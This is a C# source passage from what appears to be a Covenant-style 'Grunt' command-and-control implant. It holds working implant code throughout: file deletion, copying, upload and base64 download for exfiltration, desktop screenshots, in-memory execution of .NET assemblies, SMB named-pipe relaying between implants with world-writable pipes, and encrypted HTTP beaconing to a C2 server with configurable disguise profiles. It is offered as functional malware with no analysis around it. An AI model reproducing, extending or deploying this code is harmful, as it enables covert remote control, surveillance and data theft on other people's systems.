                        uint attrs = Native.GetFileAttributesW(message.Message);
                        if (attrs == Native.INVALID_FILE_ATTRIBUTES)
                        {
                            output += "Error: Path does not exist: " + message.Message;
                        }
                        else if ((attrs & Native.FILE_ATTRIBUTE_DIRECTORY) != 0)
                        {
                            if (Native.RemoveDirectoryW(message.Message))
                            {
                                output += "Directory deleted: " + message.Message;
                            }
                            else
                            {
                                output += "Error: Failed to delete directory (code: " + Marshal.GetLastWin32Error() + ")";
                            }
                        }
                        else
                        {
                            if (Native.DeleteFileW(message.Message))
                            {
                                output += "File deleted: " + message.Message;
                            }
                            else
                            {
                                output += "Error: Failed to delete file (code: " + Marshal.GetLastWin32Error() + ")";
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        output += "Error: " + ex.Message;
                    }
                }
                else if (message.Type == GruntTaskingType.Copy)
                {
                    // P/Invoke: CopyFileW
                    try
                    {
                        string[] parts = message.Message.Split(new char[] { '|' }, 2);
                        if (parts.Length == 2)
                        {
                            if (Native.CopyFileW(parts[0], parts[1], false))
                            {
                                output += "Copied: " + parts[0] + " -> " + parts[1];
                            }
                            else
                            {
                                output += "Error: Failed to copy file (code: " + Marshal.GetLastWin32Error() + ")";
                            }
                        }
                        else
                        {
                            output += "Error: Invalid format. Use: source|destination";
                        }
                    }
                    catch (Exception ex)
                    {
                        output += "Error: " + ex.Message;
                    }
                }
                else if (message.Type == GruntTaskingType.Download)
                {
                    // Download file from target - read file and return base64
                    try
                    {
                        IntPtr hFile = Native.CreateFileW(
                            message.Message,
                            Native.GENERIC_READ,
                            Native.FILE_SHARE_READ,
                            IntPtr.Zero,
                            Native.OPEN_EXISTING,
                            Native.FILE_ATTRIBUTE_NORMAL,
                            IntPtr.Zero);

                        if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE)
                        {
                            try
                            {
                                uint fileSize = Native.GetFileSize(hFile, IntPtr.Zero);
                                if (fileSize != Native.INVALID_FILE_SIZE && fileSize > 0)
                                {
                                    byte[] buffer = new byte[fileSize];
                                    uint bytesRead;
                                    if (Native.ReadFile(hFile, buffer, fileSize, out bytesRead, IntPtr.Zero))
                                    {
                                        output += Convert.ToBase64String(buffer, 0, (int)bytesRead);
                                    }
                                    else
                                    {
                                        output += "Error: Failed to read file (code: " + Marshal.GetLastWin32Error() + ")";
                                    }
                                }
                                else if (fileSize == 0)
                                {
                                    output += "";
                                }
                                else
                                {
                                    output += "Error: Failed to get file size (code: " + Marshal.GetLastWin32Error() + ")";
                                }
                            }
                            finally
                            {
                                Native.CloseHandle(hFile);
                            }
                        }
                        else
                        {
                            output += "Error: Failed to open file (code: " + Marshal.GetLastWin32Error() + ")";
                        }
                    }
                    catch (Exception ex)
                    {
                        output += "Error: " + ex.Message;
                    }
                }
                else if (message.Type == GruntTaskingType.Upload)
                {
                    // Upload file to target - receive base64 and write file
                    try
                    {
                        string[] parts = message.Message.Split(new char[] { '|' }, 2);
                        if (parts.Length == 2)
                        {
                            byte[] content = Convert.FromBase64String(parts[1]);

                            IntPtr hFile = Native.CreateFileW(
                                parts[0],
                                Native.GENERIC_WRITE,
                                0,
                                IntPtr.Zero,
                                Native.CREATE_ALWAYS,
                                Native.FILE_ATTRIBUTE_NORMAL,
                                IntPtr.Zero);

                            if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE)
                            {
                                try
                                {
                                    uint bytesWritten;
                                    if (Native.WriteFile(hFile, content, (uint)content.Length, out bytesWritten, IntPtr.Zero))
                                    {
                                        output += "File uploaded: " + parts[0] + " (" + bytesWritten + " bytes)";
                                    }
                                    else
                                    {
                                        output += "Error: Failed to write file (code: " + Marshal.GetLastWin32Error() + ")";
                                    }
                                }
                                finally
                                {
                                    Native.CloseHandle(hFile);
                                }
                            }
                            else
                            {
                                output += "Error: Failed to create file (code: " + Marshal.GetLastWin32Error() + ")";
                            }
                        }
                        else
                        {
                            output += "Error: Invalid format. Use: path|base64content";
                        }
                    }
                    catch (Exception ex)
                    {
                        output += "Error: " + ex.Message;
                    }
                }
                else if (message.Type == GruntTaskingType.Screenshot)
                {
                    // P/Invoke: GDI32 screenshot using BitBlt
                    try
                    {
                        IntPtr hDesktop = Native.GetDesktopWindow();
                        IntPtr hDC = Native.GetDC(hDesktop);
                        Native.RECT rect;
                        Native.GetWindowRect(hDesktop, out rect);

                        int width = rect.Right - rect.Left;
                        int height = rect.Bottom - rect.Top;

                        IntPtr hMemDC = Native.CreateCompatibleDC(hDC);
                        IntPtr hBitmap = Native.CreateCompatibleBitmap(hDC, width, height);
                        IntPtr hOld = Native.SelectObject(hMemDC, hBitmap);

                        Native.BitBlt(hMemDC, 0, 0, width, height, hDC, 0, 0, Native.SRCCOPY);
                        Native.SelectObject(hMemDC, hOld);

                        // Get bitmap bits
                        Native.BITMAPINFO bmi = new Native.BITMAPINFO();
                        bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(Native.BITMAPINFOHEADER));
                        bmi.bmiHeader.biWidth = width;
                        bmi.bmiHeader.biHeight = -height; // Top-down
                        bmi.bmiHeader.biPlanes = 1;
                        bmi.bmiHeader.biBitCount = 24;
                        bmi.bmiHeader.biCompression = Native.BI_RGB;
                        bmi.bmiColors = new uint[256];

                        int stride = ((width * 3 + 3) / 4) * 4;
                        byte[] pixels = new byte[stride * height];
                        Native.GetDIBits(hMemDC, hBitmap, 0, (uint)height, pixels, ref bmi, Native.DIB_RGB_COLORS);

                        // Create BMP file in memory
                        using (MemoryStream ms = new MemoryStream())
                        {
                            // BMP File Header (14 bytes)
                            ms.Write(new byte[] { 0x42, 0x4D }, 0, 2); // "BM"
                            int fileSize = 54 + pixels.Length;
                            ms.Write(BitConverter.GetBytes(fileSize), 0, 4);
                            ms.Write(new byte[] { 0, 0, 0, 0 }, 0, 4); // Reserved
                            ms.Write(BitConverter.GetBytes(54), 0, 4); // Offset to pixel data

                            // DIB Header (40 bytes)
                            ms.Write(BitConverter.GetBytes(40), 0, 4); // Header size
                            ms.Write(BitConverter.GetBytes(width), 0, 4);
                            ms.Write(BitConverter.GetBytes(height), 0, 4);
                            ms.Write(BitConverter.GetBytes((ushort)1), 0, 2); // Planes
                            ms.Write(BitConverter.GetBytes((ushort)24), 0, 2); // Bits per pixel
                            ms.Write(BitConverter.GetBytes(0), 0, 4); // Compression
                            ms.Write(BitConverter.GetBytes(pixels.Length), 0, 4); // Image size
                            ms.Write(BitConverter.GetBytes(0), 0, 4); // X pixels per meter
                            ms.Write(BitConverter.GetBytes(0), 0, 4); // Y pixels per meter
                            ms.Write(BitConverter.GetBytes(0), 0, 4); // Colors used
                            ms.Write(BitConverter.GetBytes(0), 0, 4); // Important colors

                            // Pixel data (need to flip vertically for BMP format)
                            for (int y = height - 1; y >= 0; y--)
                            {
                                ms.Write(pixels, y * stride, stride);
                            }

                            output += Convert.ToBase64String(ms.ToArray());
                        }

                        // Cleanup
                        Native.DeleteObject(hBitmap);
                        Native.DeleteDC(hMemDC);
                        Native.ReleaseDC(hDesktop, hDC);
                    }
                    catch (Exception ex)
                    {
                        output += "Error: " + ex.Message;
                    }
                }
                else if (message.Type == GruntTaskingType.ExecuteAssembly)
                {
                    // Execute .NET assembly in memory - receives base64 assembly and optional parameters
                    try
                    {
                        string[] parts = message.Message.Split(new char[] { '|' }, 2);
                        byte[] asmBytes = Convert.FromBase64String(parts[0]);
                        string[] args = parts.Length > 1 && !string.IsNullOrEmpty(parts[1])
                            ? SplitArgs(parts[1])
                            : new string[0];

                        Assembly asm = Assembly.Load(asmBytes);
                        MethodInfo entryPoint = asm.EntryPoint;

                        if (entryPoint != null)
                        {
                            // Capture console output
                            TextWriter realStdOut = Console.Out;
                            TextWriter realStdErr = Console.Error;
                            StringWriter sw = new StringWriter();
                            Console.SetOut(sw);
                            Console.SetError(sw);

                            try
                            {
                                object[] invokeParams = entryPoint.GetParameters().Length > 0
                                    ? new object[] { args }
                                    : null;
                                entryPoint.Invoke(null, invokeParams);
                            }
                            finally
                            {
                                Console.Out.Flush();
                                Console.Error.Flush();
                                Console.SetOut(realStdOut);
                                Console.SetError(realStdErr);
                            }

                            output += sw.ToString();
                        }
                        else
                        {
                            output += "No entry point found in assembly.";
                        }
                    }
                    catch (Exception ex)
                    {
                        output += "Error: " + ex.Message;
                        if (ex.InnerException != null)
                            output += Environment.NewLine + "Inner: " + ex.InnerException.Message;
                    }
                }
            }
            catch (Exception e)
            {
                try
                {
                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
                }
                catch (Exception) { }
            }
            finally
            {
                for (int i = 0; i < output.Length; i += MAX_MESSAGE_SIZE)
                {
                    string aRead = output.Substring(i, Math.Min(MAX_MESSAGE_SIZE, output.Length - i));
                    try
                    {
                        GruntTaskingStatus status = i + MAX_MESSAGE_SIZE < output.Length ? GruntTaskingStatus.Progressed : GruntTaskingStatus.Completed;
                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(status, aRead);
                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);
                    }
                    catch (Exception) {}
                }
                if (string.IsNullOrEmpty(output))
                {
                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "");
                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
                }
            }
            return WindowsIdentity.GetCurrent().Token;
        }

        private static string[] SplitArgs(string args)
        {
            List<string> result = new List<string>();
            bool inQuotes = false;
            string current = "";
            foreach (char c in args)
            {
                if (c == '"') { inQuotes = !inQuotes; }
                else if (c == ' ' && !inQuotes) { if (current.Length > 0) { result.Add(current); current = ""; } }
                else { current += c; }
            }
            if (current.Length > 0) { result.Add(current); }
            return result.ToArray();
        }
    }

    public enum MessageType
    {
        Read,
        Write
    }

    public class ProfileMessage
    {
        public MessageType Type { get; set; }
        public string Message { get; set; }
    }

    public class MessageEventArgs : EventArgs
    {
        public string Message { get; set; }
    }

    public interface IMessenger
    {
        string Hostname { get; }
        string Identifier { get; set; }
        string Authenticator { get; set; }
        EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
        ProfileMessage Read();
        void Write(string Message);
        void Close();
    }

    public class Profile
    {
        private string GetResponse { get; }
        private string PostRequest { get; }
        private string PostResponse { get; }

        public Profile(string GetResponse, string PostRequest, string PostResponse)
        {
            this.GetResponse = GetResponse;
            this.PostRequest = PostRequest;
            this.PostResponse = PostResponse;
        }

        public GruntEncryptedMessage ParseGetResponse(string Message) { return Parse(this.GetResponse, Message); }
        public GruntEncryptedMessage ParsePostRequest(string Message) { return Parse(this.PostRequest, Message); }
        public GruntEncryptedMessage ParsePostResponse(string Message) { return Parse(this.PostResponse, Message); }
        public string FormatGetResponse(GruntEncryptedMessage Message) { return Format(this.GetResponse, Message); }
        public string FormatPostRequest(GruntEncryptedMessage Message) { return Format(this.PostRequest, Message); }
        public string FormatPostResponse(GruntEncryptedMessage Message) { return Format(this.PostResponse, Message); }

        private static GruntEncryptedMessage Parse(string Format, string Message)
        {
            string json = Common.GruntEncoding.GetString(Utilities.MessageTransform.Invert(
                Utilities.Parse(Message, Format)[0]
            ));
            if (json == null || json.Length < 3)
            {
                return null;
            }
            return GruntEncryptedMessage.FromJson(json);
        }

        private static string Format(string Format, GruntEncryptedMessage Message)
        {
            return String.Format(Format,
                Utilities.MessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))
            );
        }
    }

    public class TaskingMessenger
    {
        private object _UpstreamLock = new object();
        private IMessenger UpstreamMessenger { get; set; }
        private object _MessageQueueLock = new object();
        private Queue<string> MessageQueue { get; } = new Queue<string>();

        private MessageCrafter Crafter { get; }
        private Profile Profile { get; }

        protected List<IMessenger> DownstreamMessengers { get; } = new List<IMessenger>();

        public TaskingMessenger(MessageCrafter Crafter, IMessenger Messenger, Profile Profile)
        {
            this.Crafter = Crafter;
            this.UpstreamMessenger = Messenger;
            this.Profile = Profile;
            this.UpstreamMessenger.UpstreamEventHandler += (sender, e) => {
                this.QueueTaskingMessage(e.Message);
                this.WriteTaskingMessage();
            };
        }

        public GruntTaskingMessage ReadTaskingMessage()
        {
            ProfileMessage readMessage = null;
            lock (_UpstreamLock)
            {
                readMessage = this.UpstreamMessenger.Read();
            }
            if (readMessage == null)
            {
                return null;
            }
            GruntEncryptedMessage gruntMessage = null;
            if (readMessage.Type == MessageType.Read) 
            {
                gruntMessage = this.Profile.ParseGetResponse(readMessage.Message);
            }
            else if (readMessage.Type == MessageType.Write)
            {
                gruntMessage = this.Profile.ParsePostResponse(readMessage.Message);
            }
            if (gruntMessage == null)
            {
                return null;
            }
            else if (gruntMessage.Type == GruntEncryptedMessage.GruntEncryptedMessageType.Tasking)
            {
                string json = this.Crafter.Retrieve(gruntMessage);
                return (json == null || json == "") ? null : GruntTaskingMessage.FromJson(json);
            }
            else
            {
                string json = this.Crafter.Retrieve(gruntMessage);
                GruntEncryptedMessage wrappedMessage = GruntEncryptedMessage.FromJson(json);
                IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);
                if (relay != null)
                {
                    relay.Write(this.Profile.FormatGetResponse(wrappedMessage));
                }
                return null;
            }
        }

        public void QueueTaskingMessage(string Message, string Meta = "")
        {
            GruntEncryptedMessage gruntMessage = this.Crafter.Create(Message, Meta);
            string uploaded = this.Profile.FormatPostRequest(gruntMessage);
            lock (_MessageQueueLock)
            {
                this.MessageQueue.Enqueue(uploaded);
            }
        }

        public void WriteTaskingMessage()
        {
            try
            {
                lock (_UpstreamLock)
                {
                    lock (_MessageQueueLock)
                    {
                        this.UpstreamMessenger.Write(this.MessageQueue.Dequeue());
                    }
                }
            }
            catch (InvalidOperationException) {}
        }

        public void SetAuthenticator(string Authenticator)
        {
            lock (this._UpstreamLock)
            {
                this.UpstreamMessenger.Authenticator = Authenticator;
            }
        }

        public bool Connect(string Hostname, string PipeName)
        {
            IMessenger olddownstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Hostname.ToLower() == (Hostname + ":" + PipeName).ToLower());
            if (olddownstream != null)
            {
                olddownstream.Close();
                this.DownstreamMessengers.Remove(olddownstream);
            }

            SMBMessenger downstream = new SMBMessenger(Hostname, PipeName);
            Thread readThread = new Thread(() =>
            {
                while (downstream.IsConnected)
                {
                    try
                    {
                        ProfileMessage read = downstream.Read();
                        if (read != null && !string.IsNullOrEmpty(read.Message))
                        {
                            if (string.IsNullOrEmpty(downstream.Identifier))
                            {
                                GruntEncryptedMessage message = this.Profile.ParsePostRequest(read.Message);
                                if (message.GUID.Length == 20)
                                {
                                    downstream.Identifier = message.GUID.Substring(10);
                                }
                                else if (message.GUID.Length == 10)
                                {
                                    downstream.Identifier = message.GUID;
                                }
                            }
                            this.UpstreamMessenger.Write(read.Message);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine("Thread Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                }
                // Connection became disconnected and therefore we remove the downstream object
                this.DownstreamMessengers.Remove(downstream);
            });
            downstream.ReadThread = readThread;
            downstream.ReadThread.Start();
            this.DownstreamMessengers.Add(downstream);
            return true;
        }

        public bool Disconnect(string Identifier)
        {
            IMessenger downstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier.ToLower() == Identifier.ToLower());
            if (downstream != null)
            {
                downstream.Close();
                this.DownstreamMessengers.Remove(downstream);
                return true;
            }
            return false;
        }
    }

    public class SMBMessenger : IMessenger
    {
        public string Hostname { get; } = string.Empty;
        public string Identifier { get; set; } = string.Empty;
        public string Authenticator { get; set; } = string.Empty;
        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
        public Thread ReadThread { get; set; } = null;

        private string PipeName { get; } = null;
        // Thread that monitors the status of the named pipe and updates _IsConnected accordingly.
        private Thread MonitoringThread { get; set; } = null;
        // This flag syncs communication peers in case one of the them dies (see method Read and Write)
        private bool IsServer { get; set; }
        private int Timeout { get; set; } = 5000;

        private object _PipeLock = new object();
        private PipeStream _Pipe;
        private PipeStream Pipe
        {
            get { lock (this._PipeLock) { return this._Pipe; } }
            set { lock (this._PipeLock) { this._Pipe = value; } }
        }

        protected object _IsConnectedLock = new object();
        private bool _IsConnected;
        public bool IsConnected
        {
            get { lock (this._IsConnectedLock) { return this._IsConnected; } }
            set { lock (this._IsConnectedLock) { this._IsConnected = value; } }
        }

        public SMBMessenger(string Hostname, string Pipename)
        {
            this.Hostname = Hostname;
            this.PipeName = Pipename;
            this.IsServer = false;
            this.InitializePipe();
        }

        public SMBMessenger(PipeStream Pipe, string Pipename)
        {
            this.Pipe = Pipe;
            this.PipeName = Pipename;
            this.IsServer = true;
            if (Pipe != null && Pipe.IsConnected)
            {
                this.IsConnected = Pipe.IsConnected;
                this.MonitorPipeState();
            }
            this.InitializePipe();
        }

        public ProfileMessage Read()
        {
            ProfileMessage result = null;
            try
            {
                // If the Grunt acts as SMB server, then after an interruption it shall wait in the read method until the connection 
                // is re-established.
                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
                if (this.IsServer)
                {
                    this.InitializePipe();
                }
                if (this.IsConnected)
                {
                    result = new ProfileMessage { Type = MessageType.Read, Message = Common.GruntEncoding.GetString(this.ReadBytes()) };
                }
            }
            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll 
            // try to restablish the named pipe
            catch (IOException) { }
            catch (NullReferenceException) { }
            catch (ObjectDisposedException) { }
            return result;
        }

        public void Write(string Message)
        {
            try
            {
                // If the Grunt acts as SMB client, then after an interruption it shall wait in the write method until the connection 
                // is re-established.
                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
                if (!this.IsServer)
                {
                    this.InitializePipe();
                }
                if (this.IsConnected)
                {
                    this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
                }
            }
            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll 
            // try to restablish the named pipe
            catch (IOException) { }
            catch (NullReferenceException) { }
            catch (ObjectDisposedException) { }
        }

        public void Close()
        {
            // Close named pipe and terminate MonitoringThread by setting IsConnected to false
            lock (this._PipeLock)
            {
                try
                {
                    if (this._Pipe != null)
                    {
                        this._Pipe.Close();
                    }
                }
                catch (Exception) { }
                this._Pipe = null;
                this.IsConnected = false;
            }
        }

        private void InitializePipe()
        {
            if (!this.IsConnected)
            {
                // If named pipe became disconnected (!this.IsConnected), then wait for a new incoming connection, else continue.
                if (this.IsServer)
                {
                    PipeSecurity ps = new PipeSecurity();
                    ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                    NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                    newServerPipe.WaitForConnection();
                    this.Pipe = newServerPipe;
                    this.IsConnected = true;
                    this.MonitorPipeState();
                    // Tell the parent Grunt the GUID so that it knows to which child grunt which messages shall be forwarded. Without this message, any further communication breaks.
                    this.UpstreamEventHandler?.Invoke(this, new MessageEventArgs { Message = string.Empty });
                }
                // If named pipe became disconnected (!this.IsConnected), then try to re-connect to the SMB server, else continue.
                else
                {
                    NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
                    ClientPipe.Connect(Timeout);
                    ClientPipe.ReadMode = PipeTransmissionMode.Byte;
                    this.Pipe = ClientPipe;
                    this.IsConnected = true;
                    // Start the pipe status monitoring thread
                    this.MonitorPipeState();
                }
            }
        }

        private void MonitorPipeState()
        {
            this.MonitoringThread = new Thread(() =>
            {
                while (this.IsConnected)
                {
                    try
                    {

                        Thread.Sleep(1000);
                        // We cannot use this.Pipe.IsConnected because this will result in a deadlock
                        this.IsConnected = this._Pipe.IsConnected;
                        if (!this.IsConnected)
                        {
                            this._Pipe.Close();
                            this._Pipe = null;
                        }
                    }
                    catch (Exception) { }
                }
            });
            this.MonitoringThread.IsBackground = true;
            this.MonitoringThread.Start();
        }

        private void WriteBytes(byte[] bytes)
        {
            byte[] compressed = Utilities.Compress(bytes);
            byte[] size = new byte[4];
            size[0] = (byte)(compressed.Length >> 24);
            size[1] = (byte)(compressed.Length >> 16);
            size[2] = (byte)(compressed.Length >> 8);
            size[3] = (byte)compressed.Length;
            this.Pipe.Write(size, 0, size.Length);
            var writtenBytes = 0;
            while (writtenBytes < compressed.Length)
            {
                int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
                this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
                writtenBytes += bytesToWrite;
            }
        }

        private byte[] ReadBytes()
        {
            byte[] size = new byte[4];
            int totalReadBytes = 0;
            do
            {
                totalReadBytes += this.Pipe.Read(size, 0, size.Length);
            } while (totalReadBytes < size.Length);
            int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];

            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                totalReadBytes = 0;
                int readBytes = 0;
                do
                {
                    readBytes = this.Pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                    totalReadBytes += readBytes;
                } while (totalReadBytes < len);
                return Utilities.Decompress(ms.ToArray());
            }
        }
    }

    public class HttpMessenger : IMessenger
    {
        public string Hostname { get; } = "";
        public string Identifier { get; set; } = "";
        public string Authenticator { get; set; } = "";
        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }

        private string CovenantURI { get; }
        private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
        private object _WebClientLock = new object();

        private Random Random { get; set; } = new Random();
        private List<string> ProfileHttpHeaderNames { get; }
        private List<string> ProfileHttpHeaderValues { get; }
        private List<string> ProfileHttpUrls { get; }

        private bool UseCertPinning { get; set; }
        private bool ValidateCert { get; set; }

        private Queue<ProfileMessage> ToReadQueue { get; } = new Queue<ProfileMessage>();

        public HttpMessenger(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls)
        {
            this.CovenantURI = CovenantURI;
            this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];
            this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
            this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;
            this.ProfileHttpUrls = ProfileHttpUrls;

            this.CovenantClient.UseDefaultCredentials = true;
            this.CovenantClient.Proxy = WebRequest.DefaultWebProxy;
            this.CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            this.UseCertPinning = UseCertPinning;
            this.ValidateCert = ValidateCert;

            // Use numeric value for Tls12 (3072) for .NET Framework compatibility
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
            {
                bool valid = true;
                if (this.UseCertPinning && CovenantCertHash != "")
                {
                    valid = cert.GetCertHashString() == CovenantCertHash;
                }
                if (valid && this.ValidateCert)
                {
                    valid = errors == System.Net.Security.SslPolicyErrors.None;
                }
                return valid;
            };
        }

        public ProfileMessage Read()
        {
            if (this.ToReadQueue.Any())
            {
                return this.ToReadQueue.Dequeue();
            }
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                return new ProfileMessage { Type = MessageType.Read, Message = this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL()) };
            }
        }

        public void Write(string Message)
        {
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                ProfileMessage ToReadMessage = new ProfileMessage { Type = MessageType.Write, Message = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message) };
                if (ToReadMessage.Message != "")
                {
                    this.ToReadQueue.Enqueue(ToReadMessage);
                }
            }
        }

        public void Close() { }

        private string GetURL()
        {
            return this.ProfileHttpUrls[this.Random.Next(this.ProfileHttpUrls.Count)].Replace("{GUID}", this.Identifier);
        }

        private void SetupCookieWebClient()
        {
            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
            {
                if (ProfileHttpHeaderNames[i] == "Cookie")
                {
                    this.CovenantClient.SetCookies(new Uri(this.CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", this.Identifier));
                }
                else
                {
                    this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", this.Identifier), ProfileHttpHeaderValues[i].Replace("{GUID}", this.Identifier));
                }
            }
        }
    }

    public class MessageCrafter
    {
        private string GUID { get; }
        private Aes SessionKey { get; }

        public MessageCrafter(string GUID, Aes SessionKey)
        {
            this.GUID = GUID;
            this.SessionKey = SessionKey;
        }

        public GruntEncryptedMessage Create(string Message, string Meta = "")
        {
            return this.Create(Common.GruntEncoding.GetBytes(Message), Meta);
        }

        public GruntEncryptedMessage Create(byte[] Message, string Meta = "")
        {
            byte[] encryptedMessagePacket = Utilities.AesEncrypt(Message, this.SessionKey.Key);
            byte[] encryptionIV = new byte[Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, 0, encryptionIV, 0, Common.AesIVLength);
            byte[] encryptedMessage = new byte[encryptedMessagePacket.Length - Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, Common.AesIVLength, encryptedMessage, 0, encryptedMessagePacket.Length - Common.AesIVLength);

            byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessionKey.Key);
            return new GruntEncryptedMessage
            {
                GUID = this.GUID,
                Meta = Meta,
                EncryptedMessage = Convert.ToBase64String(encryptedMessage),
                IV = Convert.ToBase64String(encryptionIV),
                HMAC = Convert.ToBase64String(hmac)
            };
        }

        public string Retrieve(GruntEncryptedMessage message)
        {
            if (message == null || !message.VerifyHMAC(this.SessionKey.Key))
            {
                return null;
            }
            return Common.GruntEncoding.GetString(Utilities.AesDecrypt(message, SessionKey.Key));
        }
    }

    public class CookieWebClient : WebClient
    {
        private CookieContainer CookieContainer { get; }
        public CookieWebClient()
        {
            this.CookieContainer = new CookieContainer();
        }
        public void SetCookies(Uri uri, string cookies)
        {
            this.CookieContainer.SetCookies(uri, cookies);
        }
        protected override WebRequest GetWebRequest(Uri address)
        {
            var request = base.GetWebRequest(address) as HttpWebRequest;
            if (request == null) return base.GetWebRequest(address);
            request.CookieContainer = CookieContainer;
            return request;
        }
    }

    public enum GruntTaskingType
    {
        SetDelay,
        SetJitter,
        SetConnectAttempts,
        SetKillDate,
        Exit,
        Connect,
        Disconnect,
        Tasks,
        TaskKill,
        Shell,
        ShellCmd,
        PowerShell,
        WhoAmI,
        Pwd,
        Cd,
        ListDirectory,
        ReadFile,
        WriteFile,
        GetHostname,
        ProcessList,
        Kill,
        // New file operations
        CreateDirectory,
        Delete,
        Copy,
        Download,
        Upload,
        Screenshot,
        ExecuteAssembly
    }

    public class GruntTaskingMessage
    {
        public GruntTaskingType Type { get; set; }
        public string Name { get; set; }
        public string Message { get; set; }
        public bool Token { get; set; }

        private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}"",""token"":{3}}}";
        public static GruntTaskingMessage FromJson(string message)
        {
            List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat);
            if (parseList.Count < 3) { return null; }
            return new GruntTaskingMessage
            {
				Type = (GruntTaskingType)Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
                Name = parseList[1],
                Message = parseList[2],
                Token = Convert.ToBoolean(parseList[3])
            };
        }

        public static string ToJson(GruntTaskingMessage message)
        {
            return String.Format(
                GruntTaskingMessageFormat,
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Name),
                Utilities.JavaScriptStringEncode(message.Message),
                message.Token
            );
        }
    }

    public enum GruntTaskingStatus
    {
        Uninitialized,
        Tasked,
        Progressed,
        Completed,
        Aborted
    }

    public class GruntTaskingMessageResponse
    {
        public GruntTaskingMessageResponse(GruntTaskingStatus status, string output)
        {
            Status = status;
            Output = output;
        }
        public GruntTaskingStatus Status { get; set; }
        public string Output { get; set; }

        private static string GruntTaskingMessageResponseFormat = @"{{""status"":""{0}"",""output"":""{1}""}}";
        public string ToJson()
        {
            return String.Format(
                GruntTaskingMessageResponseFormat,
                this.Status.ToString("D"),
                Utilities.JavaScriptStringEncode(this.Output)
            );
        }
    }

    public class GruntEncryptedMessage
    {
        public enum GruntEncryptedMessageType
        {
            Routing,
            Tasking
        }

		public string GUID { get; set; } = "";
        public GruntEncryptedMessageType Type { get; set; }
        public string Meta { get; set; } = "";
		public string IV { get; set; } = "";
		public string EncryptedMessage { get; set; } = "";
		public string HMAC { get; set; } = "";

        public bool VerifyHMAC(byte[] Key)
        {
            if (EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
            try
            {
                var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
                return Utilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
            }
            catch
            {
                return false;
            }
        }

        private static string GruntEncryptedMessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
        public static GruntEncryptedMessage FromJson(string message)
        {
			List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat);
